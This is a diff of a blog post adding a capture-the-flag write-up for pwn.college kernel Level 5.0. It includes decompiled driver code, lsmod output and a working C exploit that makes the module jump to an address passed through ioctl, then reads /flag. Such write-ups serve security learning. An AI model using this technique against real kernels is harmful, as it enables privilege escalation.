@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: System Security (Kernel Security) series"
 published: 2025-12-19
-updated: 2025-12-19
+updated: 2025-12-20
 description: "Write-ups for pwn.college kernel exploitation series."
 image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.pfs8v4jqs.avif"
 tags: ["Pwn", "Write-ups", "Kernel"]
@@ -245,6 +245,64 @@ int main(int argc, char *argv[]) {
 
   printf("Current UID: %d\n", getuid());
   ioctl(fd, REQUEST, password);
+  printf("Current UID: %d\n", getuid());
+  system("cat /flag");
+
+  return 0;
+}
+```
+
+# Level 5.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Utilize your hacker skillset to communicate with a kernel device and get the flag.
+
+## Write-up
+
+`device_ioctl` 把 `arg` 当函数执行了，由于没开 kaslr, 所以可以直接通过 `lsmod` 得到 module 的加载基地址，用它加上模块内函数地址作为 `arg` 传入即可。
+
+```c
+__int64 __fastcall device_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)
+{
+  __int64 result; // rax
+
+  printk(&unk_928, file, cmd, arg);
+  result = -1;
+  if ( cmd == 1337 )
+  {
+    ((void (*)(void))arg)();
+    return 0;
+  }
+  return result;
+}
+```
+
+```shellsession
+~ # lsmod
+challenge 16384 0 - Live 0xffffffffc0000000 (O)
+```
+
+## Exploit
+
+```c
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/ioctl.h>
+#include <unistd.h>
+
+#define REQUEST 1337
+
+int main(int argc, char *argv[]) {
+  int fd = open("/proc/pwncollege", O_WRONLY);
+
+  printf("Current UID: %d\n", getuid());
+  ioctl(fd, REQUEST, 0xffffffffc0000000 + 0x8BD);
   printf("Current UID: %d\n", getuid());
   system("cat /flag");
 
